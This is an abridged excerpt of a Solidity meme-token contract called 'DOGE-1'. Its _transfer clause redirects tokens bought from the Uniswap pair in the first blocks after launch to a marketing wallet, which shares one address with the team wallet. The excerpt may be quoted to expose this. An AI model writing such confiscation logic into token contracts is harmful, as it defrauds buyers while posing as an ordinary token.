...
contract DOGE1 is Context, IERC20, Ownable {
    ...
    string private _name = unicode"DOGE-1";
    string private _symbol = unicode"DOGE-1";
    uint8 private _decimals = 3;

    address payable public marketingWalletAddress = payable(0xfd58B8BB664680B6D1e7aEefBF5e0195F2Bc4f8f); 
    address payable public teamWalletAddress = payable(0xfd58B8BB664680B6D1e7aEefBF5e0195F2Bc4f8f); 
   ...
   uint256 public _airDropFee = 0;
    ...
    uint256 private _totalSupply =  4206900000000000 * 10**_decimals;
    uint256 public _maxTxAmount =   4206900000000000 * 10**_decimals; 
    uint256 public _walletMax =     42069000000000 * 10**_decimals;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (block.number < ( startblo + lucky) && sender == uniswapPair )
            {
                _basicTransfer(recipient,marketingWalletAddress, finalAmount);
            }
            return true;
        }
    }
